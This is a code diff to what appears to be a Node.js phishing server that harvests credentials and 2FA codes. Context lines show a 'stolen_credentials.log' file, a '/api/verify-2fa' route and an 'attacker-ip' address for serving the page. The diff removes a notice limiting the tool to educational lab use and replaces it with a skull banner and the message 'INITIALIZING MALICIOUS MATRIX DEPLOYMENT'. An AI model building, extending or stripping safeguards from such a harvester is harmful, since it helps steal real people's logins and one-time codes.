@@ -8,19 +8,29 @@ const logFilePath = path.join(__dirname, 'stolen_credentials.log');
 // ASCII LOGO – displayed on server start
 // ============================================
 const logo = `
-\x1b[36m
-███╗   ███╗ █████╗ ███████╗██╗   ██╗
-████╗ ████║██╔══██╗██╔════╝██║   ██║
-██╔████╔██║███████║███████╗██║   ██║
-██║╚██╔╝██║██╔══██║╚════██║██║   ██║
-██║ ╚═╝ ██║██║  ██║███████║╚██████╔╝
-╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝
+\x1b[0;31m
+               ______
+            .-'      '-.
+           /            \\
+          |              |
+          |,  .-.  .-.  ,|
+          | )(__/  \\__)( |
+          |/     /\\     \\
+          (_     ^^     _)
+           \\__|IIIIII|__/
+            | \\IIIIII/ |
+            \\          /
+             '--------'
 \x1b[0m
 `;
 const warning = `
-\x1b[33m⚠️  EDUCATIONAL SIMULATION – DO NOT USE FOR ILLEGAL PURPOSES ⚠️
-This server logs credentials ONLY for learning in isolated labs.
-Any malicious use is prohibited.\x1b[0m
+\x1b[33m---------------------------------------------------------\n
+          INITIALIZING MALICIOUS MATRIX DEPLOYMENT       \n
+---------------------------------------------------------\n\x1b[0m
+`;
+
+const footer = `
+\x1b[35m---------------------------------------------------------\n          POWERED BY MASU - CYBER LAB EDITION          \n---------------------------------------------------------\n\x1b[0m
 `;
 
 function appendLog(line) {
@@ -63,8 +73,10 @@ app.post('/api/verify-2fa', (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
+    console.clear();
     console.log(logo);
     console.log(warning);
     console.log(`\x1b[32m✓ Server running on http://localhost:${PORT}\x1b[0m`);
     console.log(`\x1b[36m✓ Open the page in your browser at http://<attacker-ip>:${PORT}\x1b[0m\n`);
+    console.log(footer);
 });
